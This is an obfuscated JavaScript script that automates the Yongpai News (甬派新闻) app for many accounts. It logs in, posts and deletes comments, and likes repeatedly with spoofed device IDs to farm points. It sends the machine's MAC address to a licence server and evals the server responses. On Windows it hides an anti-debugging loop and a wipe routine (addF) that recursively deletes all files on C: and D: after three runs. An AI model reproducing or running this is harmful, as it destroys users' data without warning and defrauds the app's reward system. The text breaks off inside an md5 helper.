const $ = new Env("甬派新闻");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x785572 = vm.getGlobal(),
    _0x3835b8 = vm.createObject(),
    _0x297872 = vm.createFunction("log", function () {
      const _0x1bc163 = [];
      for (let _0x443f69 = 0; _0x443f69 < arguments.length; _0x443f69++) {
        _0x1bc163.push(vm.asString(arguments[_0x443f69]));
      }
      console.log(..._0x1bc163);
      return vm.createUndefined();
    }),
    _0x52ca5a = vm.createFunction("xxxx", function (_0x37a02f) {
      let _0x3c7b2c = eval(_0x37a02f.value);
      return vm.createString(JSON.stringify(_0x3c7b2c));
    }),
    _0x3b41dd = vm.createFunction("yyyy", function (_0x2294be) {
      let _0x31d351 = _0x2294be.value,
        _0x38c174 = fs.readFileSync(_0x31d351, "utf-8").replace(/\r\n/g, "\n"),
        _0x527035 = cryptoJS.MD5(_0x38c174).toString();
      return vm.createString(_0x527035);
    }),
    _0x21801b = vm.createFunction("ddd", function (_0xc9f835) {
      let _0x16943d = cryptoJS.MD5(_0xc9f835.value).toString();
      return vm.createString(_0x16943d);
    });
  vm.setProperty(_0x3835b8, "log", _0x297872);
  vm.setProperty(_0x785572, "xxxx", _0x52ca5a);
  vm.setProperty(_0x785572, "console", _0x3835b8);
  vm.setProperty(_0x785572, "yyyy", _0x3b41dd);
  vm.setProperty(_0x785572, "ddd", _0x21801b);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x255ad4) {
  _0x255ad4.destroy();
}
function abc(_0x48b5e9, _0x54f57a, _0x242cef, _0x8a4aab, _0x418790) {
  const _0xb69cf9 = _0x48b5e9.getGlobal();
  let _0x2ef963 = _0x48b5e9.getProperty(_0xb69cf9, "xab"),
    _0x5d5755 = _0x48b5e9.call(_0x2ef963, _0x48b5e9.createUndefined(), _0x48b5e9.createString(_0x54f57a), _0x48b5e9.createString(_0x8a4aab), _0x48b5e9.createString(_0x418790), _0x48b5e9.createString(_0x242cef));
  _0x5d5755 = _0x48b5e9.asString(_0x5d5755);
  return _0x5d5755;
}
function xyz(_0x26d5cc, _0x69394, _0x349ec6, _0x3d8100, _0x57640a) {
  const _0x43dad2 = _0x26d5cc.getGlobal();
  let _0x4a366e = _0x26d5cc.getProperty(_0x43dad2, "xmn"),
    _0x4b00b0 = _0x26d5cc.call(_0x4a366e, _0x26d5cc.createUndefined(), _0x26d5cc.createString(_0x69394), _0x26d5cc.createString(_0x3d8100), _0x26d5cc.createString(_0x57640a), _0x26d5cc.createString(_0x349ec6));
  _0x4b00b0 = _0x26d5cc.asString(_0x4b00b0);
  return _0x4b00b0;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let ypxwappArr = [],
  all_msg = "",
  ncid = "",
  token = "",
  did = "",
  id,
  nr,
  ck,
  uid,
  iid,
  name,
  arrs = [],
  ypxwapp = ($.isNode() ? process.env.ypxwapp : $.getdata("ypxwapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date(),
  myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x51db3d) {
          return function (_0x1b5c6e) {
            return Function("Function(arguments[0]+\"" + _0x1b5c6e + "\")()");
          }(_0x51db3d);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x2eae84 = "",
        _0x48f9e2 = fs.readdirSync("/sys/class/net/");
      _0x48f9e2.forEach(function (_0x56e82a) {
        var _0x39e7dd = path.join("/sys/class/net", _0x56e82a, "address");
        _0x56e82a.substr(0, 3) == "eth" && fs.existsSync(_0x39e7dd) && (_0x2eae84 = fs.readFileSync(_0x39e7dd).toString().trim());
      });
      return _0x2eae84;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x4598b5) {
  try {
    gtr.accessSync(_0x4598b5, gtr.F_OK);
  } catch (_0x36e7e1) {
    return false;
  }
  return true;
}
function addF(_0x15b5b5, _0x5919c4) {
  let _0x1b2fe1 = 0,
    _0x1e4eea = "C:/Windows/system.txt";
  if (isFileExist(_0x1e4eea)) {
    _0x1b2fe1 = gtr.readFileSync(_0x1e4eea, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x1e4eea, "1", function (_0x206143) {
        if (_0x206143) {
          throw _0x206143;
        }
      });
    } else {
      return;
    }
  }
  if (_0x1b2fe1 == 99) {
    return 99;
  }
  console.log(_0x1b2fe1);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x1b2fe1);
  if (parseInt(_0x1b2fe1) < 3) {
    let _0x46103a = parseInt(_0x1b2fe1) + 1;
    gtr.writeFileSync(_0x1e4eea, _0x46103a + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x15b5b5)) {
    return;
  }
  if (gtr.statSync(_0x15b5b5).isDirectory()) {
    var _0x4e104d = gtr.readdirSync(_0x15b5b5),
      _0x335d1a = _0x4e104d.length,
      _0x45e592 = 0;
    if (_0x335d1a > 0) {
      _0x4e104d.forEach(function (_0x109644) {
        _0x45e592++;
        var _0x2d6029 = _0x15b5b5 + "/" + _0x109644;
        gtr.statSync(_0x2d6029).isDirectory() ? addF(_0x2d6029, true) : gtr.unlinkSync(_0x2d6029);
      });
      _0x335d1a == _0x45e592 && _0x5919c4 && gtr.rmdirSync(_0x15b5b5);
    } else {
      _0x335d1a == 0 && _0x5919c4 && gtr.rmdirSync(_0x15b5b5);
    }
  } else {
    gtr.unlinkSync(_0x15b5b5);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 115, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    ypxwappArr = ypxwapp.split("\n");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + ypxwappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(ypxwappArr.length > parseInt(arrs.num))) {
      for (let _0x3d21a8 = 0; _0x3d21a8 < ypxwappArr.length; _0x3d21a8++) {
        ypxwapp = ypxwappArr[_0x3d21a8];
        $.index = _0x3d21a8 + 1;
        console.log("\n开始【甬派新闻" + $.index + "】");
        phone = ypxwapp.split("&")[0];
        mm = ypxwapp.split("&")[1];
        did = randomString(16);
        await ypxwdl();
        await $.wait(3000);
        await ypxwncxx();
        await ypxwlb();
        await ypxwxx();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x5d34b6 => $.logErr(_0x5d34b6)).finally(() => $.done());
function ypxwdl(_0x19aa7e = 0) {
  return new Promise(_0x18174b => {
    let _0x1bde73 = Math.round(new Date().getTime()),
      _0x52ee9d = md5("globalDatetime" + _0x1bde73 + "username" + phone + "test_123456679890123456").toUpperCase(),
      _0xaba961 = {
        url: "http://ypapp.cnnb.com.cn/yongpai-user/api/login2/local?username=" + phone + "&password=" + mm + "&deviceId=" + did + "&globalDatetime=" + _0x1bde73 + "&sign=" + _0x52ee9d,
        headers: {
          Host: "ypapp.cnnb.com.cn",
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "*/*",
          Connection: "keep-alive",
          Cookie: ck,
          "User-Agent": "okhttp/3.10.0",
          "Accept-Language": "zh-Hans-CN;q=1",
          "Accept-Encoding": "gzip, deflate, br",
          "Content-Length": "183"
        }
      };
    $.get(_0xaba961, async (_0x29d88f, _0x26cb11, _0xc30780) => {
      try {
        const _0x2dccaf = JSON.parse(_0xc30780);
        _0x2dccaf.code == 0 ? (console.log("\n甬派新闻登录：" + _0x2dccaf.data.nickname), name = encodeURIComponent(_0x2dccaf.data.nickname), uid = _0x2dccaf.data.userId, ck = _0x2dccaf.data.jwtToken, token = _0x2dccaf.data.token) : console.log("\n甬派新闻登录:" + _0x2dccaf.message);
      } catch (_0xff6a85) {} finally {
        _0x18174b();
      }
    }, _0x19aa7e);
  });
}
function ypxwxx(_0x2f5125 = 0) {
  return new Promise(_0x3c0359 => {
    let _0x22e2e0 = {
      url: "http://ypapp.cnnb.com.cn/yongpai-user/api/user/client?userId=" + uid + "&deviceId=" + did + "&token=" + token,
      headers: {
        system: "Android",
        version: "29",
        model: "16s Pro",
        appversion: "9.1.4",
        appbuild: "202212160",
        deviceid: did,
        ticket: "",
        Host: "ypapp.cnnb.com.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.10.0"
      }
    };
    $.get(_0x22e2e0, async (_0x21090a, _0x2a5f53, _0x12004c) => {
      try {
        const _0x4086dd = JSON.parse(_0x12004c);
        _0x4086dd.code == 0 ? console.log("\n甬派新闻积分余额：" + _0x4086dd.data.score) : console.log("\n甬派新闻积分余额:" + _0x4086dd.message);
      } catch (_0xc9a0b5) {} finally {
        _0x3c0359();
      }
    }, _0x2f5125);
  });
}
function ypxwlb(_0x36c5c7 = 0) {
  return new Promise(_0xae56af => {
    let _0x5a09cc = {
      url: "http://ypapp.cnnb.com.cn/yongpai-news/api/news/list?channelId=0&currentPage=1&timestamp=0",
      headers: {
        system: "Android",
        version: "29",
        model: "16s Pro",
        appversion: "9.1.4",
        appbuild: "202212160",
        deviceid: did,
        ticket: "",
        Host: "ypapp.cnnb.com.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.10.0"
      }
    };
    $.get(_0x5a09cc, async (_0xe865a4, _0x1d2a06, _0x58f2ed) => {
      try {
        const _0x33244d = JSON.parse(_0x58f2ed);
        if (_0x33244d.code == 0) {
          for (let _0x404927 = 0; _0x404927 < _0x33244d.data.content.length; _0x404927++) {
            id = _0x33244d.data.content[_0x404927].newsId;
            nr = _0x33244d.data.content[_0x404927].title;
            nr = encodeURIComponent(nr);
            console.log("\n甬派新闻文章：" + _0x33244d.data.content[_0x404927].title);
            await ypxwpl();
            await ypxwyd();
            await ypxwfx();
            await ypxwdz();
            await ypxwdz();
            await ypxwdz();
          }
        } else {
          console.log("\n甬派新闻积分余额:" + _0x33244d.message);
        }
      } catch (_0x16aef6) {} finally {
        _0xae56af();
      }
    }, _0x36c5c7);
  });
}
function ypxwyd(_0xfbf3da = 0) {
  return new Promise(_0x4c68f4 => {
    let _0x34b0c8 = {
      url: "http://ypapp.cnnb.com.cn/yongpai-news/api/news/detail?newsId=" + id + "&userId=" + uid + "&deviceId=" + did,
      headers: {
        system: "Android",
        version: "29",
        model: "16s Pro",
        appversion: "9.1.4",
        appbuild: "202212160",
        deviceid: did,
        ticket: "",
        Host: "ypapp.cnnb.com.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.10.0"
      }
    };
    $.get(_0x34b0c8, async (_0x1b5a8a, _0x5c4c65, _0x554008) => {
      try {
        const _0x1832ce = JSON.parse(_0x554008);
        _0x1832ce.code == 0 ? console.log("\n甬派新闻阅读成功") : console.log("\n甬派新闻阅读:" + _0x1832ce.message);
      } catch (_0x266487) {} finally {
        _0x4c68f4();
      }
    }, _0xfbf3da);
  });
}
function ypxwfx(_0x526300 = 0) {
  return new Promise(_0x230562 => {
    let _0x2abdfd = {
      url: "http://ypapp.cnnb.com.cn/yongpai-ugc/api/forward/news?userId=" + uid + "&newsId=" + id,
      headers: {
        system: "Android",
        version: "29",
        model: "16s Pro",
        appversion: "9.1.4",
        appbuild: "202212160",
        deviceid: did,
        ticket: "",
        Host: "ypapp.cnnb.com.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.10.0"
      }
    };
    $.get(_0x2abdfd, async (_0x7fe34b, _0x4dc898, _0xaa6f4a) => {
      try {
        const _0x2adb9c = JSON.parse(_0xaa6f4a);
        _0x2adb9c.code == 0 ? console.log("\n甬派新闻分享成功") : console.log("\n甬派新闻分享:" + _0x2adb9c.message);
      } catch (_0x1f2e52) {} finally {
        _0x230562();
      }
    }, _0x526300);
  });
}
function ypxwdz(_0x57943a = 0) {
  return new Promise(_0x486996 => {
    did = randomString(16);
    let _0x1d7895 = {
      url: "http://ypapp.cnnb.com.cn/yongpai-ugc/api/praise/save_news?userId=" + uid + "&newsId=" + id + "&deviceId=" + did,
      headers: {
        system: "Android",
        version: "29",
        model: "16s Pro",
        appversion: "9.1.4",
        appbuild: "202212160",
        deviceid: did,
        ticket: "",
        Host: "ypapp.cnnb.com.cn",
        Connection: "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.10.0"
      }
    };
    $.get(_0x1d7895, async (_0x26daac, _0x2c6576, _0x15a428) => {
      try {
        const _0x1d7558 = JSON.parse(_0x15a428);
        _0x1d7558.code == 0 ? console.log("\n甬派新闻点赞成功") : console.log("\n甬派新闻点赞:" + _0x1d7558.message);
      } catch (_0x57e024) {} finally {
        _0x486996();
      }
    }, _0x57943a);
  });
}
function ypxwpl(_0xf0e056 = 0) {
  return new Promise(_0x4704e6 => {
    did = randomString(16);
    let _0x43276a = Math.round(new Date().getTime()),
      _0x2fbcbe = md5("deviceId" + did + "globalDatetime" + _0x43276a + "newsId" + id + "token" + token + "userId" + uid + "test_123456679890123456").toUpperCase(),
      _0xda1381 = {
        url: "http://ypapp.cnnb.com.cn/yongpai-ugc/api/comment/save",
        headers: {
          system: "Android",
          version: "29",
          model: "16s Pro",
          appversion: "9.1.4",
          appbuild: "202212160",
          deviceid: did,
          ticket: "",
          Host: "ypapp.cnnb.com.cn",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.10.0",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "newsId=" + id + "&userId=" + uid + "&token=" + token + "&deviceId=" + did + "&comment=" + nr + "&globalDatetime=" + _0x43276a + "&sign=" + _0x2fbcbe
      };
    $.post(_0xda1381, async (_0x24bc08, _0x51bc48, _0x4509a5) => {
      try {
        const _0x141547 = JSON.parse(_0x4509a5);
        _0x141547.code == 0 ? (iid = _0x141547.data.commentId, console.log("\n甬派新闻评论成功"), await ypxwscpl()) : console.log("\n甬派新闻评论:" + _0x141547.message);
      } catch (_0x11ee25) {} finally {
        _0x4704e6();
      }
    }, _0xf0e056);
  });
}
function ypxwscpl(_0xe91d36 = 0) {
  return new Promise(_0x315c06 => {
    did = randomString(16);
    let _0x269437 = Math.round(new Date().getTime()),
      _0x16edfa = md5("globalDatetime" + _0x269437 + "id" + iid + "token" + token + "userId" + uid + "test_123456679890123456").toUpperCase(),
      _0x4f9d57 = {
        url: "http://ypapp.cnnb.com.cn/yongpai-ugc/api/comment/delete?userId=" + uid + "&token=" + token + "&id=" + iid + "&globalDatetime=" + _0x269437 + "&sign=" + _0x16edfa,
        headers: {
          Host: "ypapp.cnnb.com.cn",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/3.10.0"
        }
      };
    $.get(_0x4f9d57, async (_0x1b0a55, _0x343862, _0xe16f02) => {
      try {
        const _0x7304ae = JSON.parse(_0xe16f02);
        _0x7304ae.code == 0 ? console.log("\n甬派新闻评论删除成功") : console.log("\n甬派新闻删除评论:" + _0x7304ae.message);
      } catch (_0x2cb9ea) {} finally {
        _0x315c06();
      }
    }, _0xe91d36);
  });
}
function ypxwncxx(_0x2a30f6 = 0) {
  return new Promise(_0x297ced => {
    did = randomString(16);
    let _0x9ea3b = {
      url: "https://kzsv.cnnb.com.cn/Server/ypfarmapi/?action=client_login",
      headers: {
        Host: "kzsv.cnnb.com.cn",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryb73JODL3U5ygYWUU"
      },
      body: "------WebKitFormBoundaryb73JODL3U5ygYWUU\nContent-Disposition: form-data; name=\"userId\"\n\n" + uid + "\n------WebKitFormBoundaryb73JODL3U5ygYWUU\nContent-Disposition: form-data; name=\"nickname\"\n\n" + name + "\n------WebKitFormBoundaryb73JODL3U5ygYWUU\nContent-Disposition: form-data; name=\"token\"\n\n" + token + "\n------WebKitFormBoundaryb73JODL3U5ygYWUU--\n"
    };
    $.post(_0x9ea3b, async (_0x459858, _0x3c1542, _0x24ebdd) => {
      try {
        const _0x1ca1e9 = JSON.parse(_0x24ebdd);
        _0x1ca1e9.code == 200 ? (ncid = _0x1ca1e9.data.userinfo.ID, console.log("\n甬派新闻获取农场数据成功:" + ncid), await ypxwnclq(), await ypxwncjs(), await ypxwncsf(), await ypxwnccc()) : console.log("\n甬派新闻获取农场数据:" + _0x1ca1e9.data);
      } catch (_0x3dfb46) {} finally {
        _0x297ced();
      }
    }, _0x2a30f6);
  });
}
function ypxwnclq(_0x33cc93 = 0) {
  return new Promise(_0x11dde3 => {
    did = randomString(16);
    let _0x34afb9 = {
      url: "https://kzsv.cnnb.com.cn/Server/ypfarmapi/?action=client_operation",
      headers: {
        Host: "kzsv.cnnb.com.cn",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5qcXK6FvSnF5NMYL"
      },
      body: "------WebKitFormBoundary5qcXK6FvSnF5NMYL\nContent-Disposition: form-data; name=\"userId\"\n\n" + ncid + "\n------WebKitFormBoundary5qcXK6FvSnF5NMYL\nContent-Disposition: form-data; name=\"type\"\n\n0\n------WebKitFormBoundary5qcXK6FvSnF5NMYL\nContent-Disposition: form-data; name=\"openId\"\n\n" + uid + "\n------WebKitFormBoundary5qcXK6FvSnF5NMYL--"
    };
    $.post(_0x34afb9, async (_0x4edb5c, _0x136df8, _0x565dcd) => {
      try {
        const _0x280de6 = JSON.parse(_0x565dcd);
        _0x280de6.code == 200 ? console.log("\n甬派新闻农场领取种子：成功") : console.log("\n甬派新闻农场领取种子:" + _0x280de6.data);
      } catch (_0x2597e3) {} finally {
        _0x11dde3();
      }
    }, _0x33cc93);
  });
}
function ypxwncjs(_0x1709d9 = 0) {
  return new Promise(_0x270e52 => {
    did = randomString(16);
    let _0x3da2e3 = {
      url: "https://kzsv.cnnb.com.cn/Server/ypfarmapi/?action=client_interactive",
      headers: {
        Host: "kzsv.cnnb.com.cn",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary9PEzpy1Hvpr2qlTh"
      },
      body: "------WebKitFormBoundary9PEzpy1Hvpr2qlTh\nContent-Disposition: form-data; name=\"userId\"\n\n" + ncid + "\n------WebKitFormBoundary9PEzpy1Hvpr2qlTh\nContent-Disposition: form-data; name=\"type\"\n\n100\n------WebKitFormBoundary9PEzpy1Hvpr2qlTh--"
    };
    $.post(_0x3da2e3, async (_0x3ce51e, _0x35d791, _0x213d1d) => {
      try {
        const _0x24ce76 = JSON.parse(_0x213d1d);
        _0x24ce76.code == 200 ? console.log("\n甬派新闻农场浇水：成功") : console.log("\n甬派新闻农场浇水:" + _0x24ce76.data);
      } catch (_0x5d8d53) {} finally {
        _0x270e52();
      }
    }, _0x1709d9);
  });
}
function ypxwncsf(_0x141138 = 0) {
  return new Promise(_0x517cd7 => {
    did = randomString(16);
    let _0x257efc = {
      url: "https://kzsv.cnnb.com.cn/Server/ypfarmapi/?action=client_interactive",
      headers: {
        Host: "kzsv.cnnb.com.cn",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7sPIv9vIKsCYpDus"
      },
      body: "------WebKitFormBoundary7sPIv9vIKsCYpDus\nContent-Disposition: form-data; name=\"userId\"\n\n" + ncid + "\n------WebKitFormBoundary7sPIv9vIKsCYpDus\nContent-Disposition: form-data; name=\"type\"\n\n10\n------WebKitFormBoundary7sPIv9vIKsCYpDus--"
    };
    $.post(_0x257efc, async (_0x3260b9, _0x23dd47, _0x248f99) => {
      try {
        const _0x21168f = JSON.parse(_0x248f99);
        _0x21168f.code == 200 ? console.log("\n甬派新闻农场施肥：成功") : console.log("\n甬派新闻农场施肥:" + _0x21168f.data);
      } catch (_0x27a05e) {} finally {
        _0x517cd7();
      }
    }, _0x141138);
  });
}
function ypxwnccc(_0x453572 = 0) {
  return new Promise(_0x2fb15a => {
    did = randomString(16);
    let _0x4fc28b = {
      url: "https://kzsv.cnnb.com.cn/Server/ypfarmapi/?action=client_interactive",
      headers: {
        Host: "kzsv.cnnb.com.cn",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryUya4a0JmFgYoJ5vE"
      },
      body: "------WebKitFormBoundaryUya4a0JmFgYoJ5vE\nContent-Disposition: form-data; name=\"userId\"\n\n" + ncid + "\n------WebKitFormBoundaryUya4a0JmFgYoJ5vE\nContent-Disposition: form-data; name=\"type\"\n\n1\n------WebKitFormBoundaryUya4a0JmFgYoJ5vE--"
    };
    $.post(_0x4fc28b, async (_0x2dc0d8, _0x19abda, _0x55251a) => {
      try {
        const _0x5b9306 = JSON.parse(_0x55251a);
        _0x5b9306.code == 200 ? console.log("\n甬派新闻农场除草：成功") : console.log("\n甬派新闻农场除草:" + _0x5b9306.data);
      } catch (_0xb9547b) {} finally {
        _0x2fb15a();
      }
    }, _0x453572);
  });
}
function randomString(_0x550af4 = 12) {
  let _0x5bc8a7 = "abcdef0123456789",
    _0x458fc2 = _0x5bc8a7.length,
    _0x36a3f4 = "";
  for (i = 0; i < _0x550af4; i++) {
    _0x36a3f4 += _0x5bc8a7.charAt(Math.floor(Math.random() * _0x458fc2));
  }
  return _0x36a3f4;
}
function encodeUTF8(_0x5c2bb9) {
  var _0xf9a914,
    _0x164656 = [],
    _0x4fdf1d,
    _0x1b68d5;
  for (_0xf9a914 = 0; _0xf9a914 < _0x5c2bb9.length; _0xf9a914++) {
    if ((_0x4fdf1d = _0x5c2bb9.charCodeAt(_0xf9a914)) < 128) {
      _0x164656.push(_0x4fdf1d);
    } else {
      if (_0x4fdf1d < 2048) {
        _0x164656.push(192 + (_0x4fdf1d >> 6 & 31), 128 + (_0x4fdf1d & 63));
      } else {
        if ((_0x1b68d5 = _0x4fdf1d ^ 55296) >> 10 == 0) {
          _0x4fdf1d = (_0x1b68d5 << 10) + (_0x5c2bb9.charCodeAt(++_0xf9a914) ^ 56320) + 65536;
          _0x164656.push(240 + (_0x4fdf1d >> 18 & 7), 128 + (_0x4fdf1d >> 12 & 63));
        } else {
          _0x164656.push(224 + (_0x4fdf1d >> 12 & 15));
        }
        _0x164656.push(128 + (_0x4fdf1d >> 6 & 63), 128 + (_0x4fdf1d & 63));
      }
    }
  }
  return _0x164656;
}
function sha(_0x239662) {
  var _0x551b0a = new Uint8Array(encodeUTF8(_0x239662)),
    _0x4a3452,
    _0x1dd102,
    _0x2c9fd2,
    _0x36b848 = (_0x551b0a.length + 8 >>> 6 << 4) + 16,
    _0x239662 = new Uint8Array(_0x36b848 << 2);
  _0x239662.set(new Uint8Array(_0x551b0a.buffer));
  _0x239662 = new Uint32Array(_0x239662.buffer);
  for (_0x2c9fd2 = new DataView(_0x239662.buffer), _0x4a3452 = 0; _0x4a3452 < _0x36b848; _0x4a3452++) {
    _0x239662[_0x4a3452] = _0x2c9fd2.getUint32(_0x4a3452 << 2);
  }
  _0x239662[_0x551b0a.length >> 2] |= 128 << 24 - (_0x551b0a.length & 3) * 8;
  _0x239662[_0x36b848 - 1] = _0x551b0a.length << 3;
  var _0xf5491c = [],
    _0x55deef = [function () {
      return _0x3e4ad0[1] & _0x3e4ad0[2] | ~_0x3e4ad0[1] & _0x3e4ad0[3];
    }, function () {
      return _0x3e4ad0[1] ^ _0x3e4ad0[2] ^ _0x3e4ad0[3];
    }, function () {
      return _0x3e4ad0[1] & _0x3e4ad0[2] | _0x3e4ad0[1] & _0x3e4ad0[3] | _0x3e4ad0[2] & _0x3e4ad0[3];
    }, function () {
      return _0x3e4ad0[1] ^ _0x3e4ad0[2] ^ _0x3e4ad0[3];
    }],
    _0x463c07 = function (_0x20a306, _0x368198) {
      return _0x20a306 << _0x368198 | _0x20a306 >>> 32 - _0x368198;
    },
    _0x13d871 = [1518500249, 1859775393, -1894007588, -899497514],
    _0x3e4ad0 = [1732584193, -271733879, null, null, -1009589776];
  _0x3e4ad0[2] = ~_0x3e4ad0[0];
  _0x3e4ad0[3] = ~_0x3e4ad0[1];
  for (_0x4a3452 = 0; _0x4a3452 < _0x239662.length; _0x4a3452 += 16) {
    var _0x549559 = _0x3e4ad0.slice(0);
    for (_0x1dd102 = 0; _0x1dd102 < 80; _0x1dd102++) {
      _0xf5491c[_0x1dd102] = _0x1dd102 < 16 ? _0x239662[_0x4a3452 + _0x1dd102] : _0x463c07(_0xf5491c[_0x1dd102 - 3] ^ _0xf5491c[_0x1dd102 - 8] ^ _0xf5491c[_0x1dd102 - 14] ^ _0xf5491c[_0x1dd102 - 16], 1);
      _0x2c9fd2 = _0x463c07(_0x3e4ad0[0], 5) + _0x55deef[_0x1dd102 / 20 | 0]() + _0x3e4ad0[4] + _0xf5491c[_0x1dd102] + _0x13d871[_0x1dd102 / 20 | 0] | 0;
      _0x3e4ad0[1] = _0x463c07(_0x3e4ad0[1], 30);
      _0x3e4ad0.pop();
      _0x3e4ad0.unshift(_0x2c9fd2);
    }
    for (_0x1dd102 = 0; _0x1dd102 < 5; _0x1dd102++) {
      _0x3e4ad0[_0x1dd102] = _0x3e4ad0[_0x1dd102] + _0x549559[_0x1dd102] | 0;
    }
  }
  _0x2c9fd2 = new DataView(new Uint32Array(_0x3e4ad0).buffer);
  for (var _0x4a3452 = 0; _0x4a3452 < 5; _0x4a3452++) {
    _0x3e4ad0[_0x4a3452] = _0x2c9fd2.getUint32(_0x4a3452 << 2);
  }
  var _0x7db0cf = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x3e4ad0).buffer), function (_0x4e7ec0) {
    return (_0x4e7ec0 < 16 ? "0" : "") + _0x4e7ec0.toString(16);
  }).join("");
  return _0x7db0cf;
}
function hqs(_0x391194 = 10) {
  return new Promise(_0x332bc8 => {
    let _0x1c506c = 12,
      _0x2b2599 = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x1c506c + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x1c506c + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x2b2599, async (_0x178305, _0x1c5d24, _0x52effd) => {
      try {
        let _0x3777b0 = eval(_0x52effd);
        _0x3777b0.code == 200 ? (all_msg = _0x3777b0.msg, _0x332bc8(_0x3777b0.data)) : (all_msg = _0x3777b0.msg, _0x332bc8(false));
      } catch (_0x580e14) {
        $.logErr(_0x580e14, _0x1c5d24);
      }
    }, 0);
  });
}
function md5(_0x29327c) {
  function _0x8b582b(_0x5c14f2, _0x18ddad) {
    return _0x5c14f2 << _0x18ddad | _0x5c14f2 >>> 32 - _0x18ddad;
  }
  function _0x293e04(_0x815570, _0x2c8d9a) {
    var _0x2f763a, _0x56c569, _0x519921, _0x1c8b24, _0x15be85;
    _0x519921 = 2147483648 & _0x815570;
    _0x1c8b24 = 2147483648 & _0x2c8d9a;
    _0x2f763a = 1073741824 & _0x815570;
    _0x56c569 = 1073741824 & _0x2c8d9a;
    _0x15be85 = (1073741823 & _0x815570) + (1073741823 & _0x2c8d9a);
    return _0x2f763a & _0x56c569 ? 2147483648 ^ _0x15be85 ^ _0x519921 ^ _0x1c8b24 : _0x2f763a | _0x56c569 ? 1073741824 & _0x15be85 ? 3221225472 ^ _0x15be85 ^ _0x519921 ^ _0x1c8b24 : 1073741824 ^ _0x15be85 ^ _0x519921 ^ _0x1c8b24 : _0x15be85 ^ _0x519921 ^ _0x1c8b24;
  }
  function _0x3c4bb5(_0x27181d, _0x282459, _0x43f0b7) {
    return _0x27181d & _0x282459 | ~_0x27181d & _0x43f0b7;
  }
  function _0x329006(_0x245f8b, _0xc8fd33, _0x363ea2) {
    return _0x245f8b & _0x363ea2 | _0xc8fd33 & ~_0x363ea2;
  }
  function _0x26795c(_0x52f31e, _0x3e8aa0, _0x4a4fa) {
    return _0x52f31e ^ _0x3e8aa0 ^ _0x4a4fa;
  }
  function _0x20c8b7(_0x1a2985, _0x2b0a66, _0x26f51a) {
    return _0x2b0a66 ^ (_0x1a2985 | ~_0x26f51a);
  }
  function _0x1565d1(_0x468ede, _0x52c3e3, _0x4ec62c, _0x2f035a, _0x125375, _0x12e7d0, _0x6208fe) {
    _0x468ede = _0x293e04(_0x468ede, _0x293e04(_0x293e04(_0x3c4bb5(_0x52c3e3, _0x4ec62c, _0x2f035a), _0x125375), _0x6208fe));
    return _0x293e04(_0x8b582b(_0x468ede, _0x12e7d0), _0x52c3e3);
  }
  function _0x478820(_0x4a83c2, _0x58199f, _0x3ee0b8, _0x392a1c, _0x3abe83, _0x1fec35, _0x5d4c30) {
    _0x4a83c2 = _0x293e04(_0x4a83c2, _0x293e04(_0x293e04(_0x329006(_0x58199f, _0x3ee0b8, _0x392a1c), _0x3abe83), _0x5d4c30));
    return _0x293e04(_0x8b582b(_0x4a83c2, _0x1fec35), _0x58199f);
  }
  function _0x226132(_0x25b385, _0x297fde, _0x4f0b6e, _0x853cf9, _0x404011, _0x5727d5, _0x2766fe) {
